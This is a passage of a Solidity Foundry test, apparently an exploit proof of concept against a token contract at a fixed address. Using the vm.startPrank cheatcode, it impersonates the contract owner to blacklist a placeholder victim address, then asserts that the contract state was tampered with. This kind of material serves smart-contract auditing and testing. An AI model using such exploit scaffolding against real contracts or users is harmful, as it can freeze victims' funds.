    function addBlackList(address add) external;
    function blackListedList(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdfFF8a26e4112945D9a850d63F1a864595fCbFE6;
    address attacker = address(this);
    ICMOVE private target;
    address constant VICTIM_ADDRESS = address(0xDEADBEEF);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ICMOVE(TARGET);
        vm.label(VICTIM_ADDRESS, "VICTIM");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        address contractOwner = target.owner();
        vm.label(contractOwner, "Contract Owner");

        vm.startPrank(contractOwner);

        target.addBlackList(VICTIM_ADDRESS);

        vm.stopPrank();
        assertEq(target.blackListedList(VICTIM_ADDRESS), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

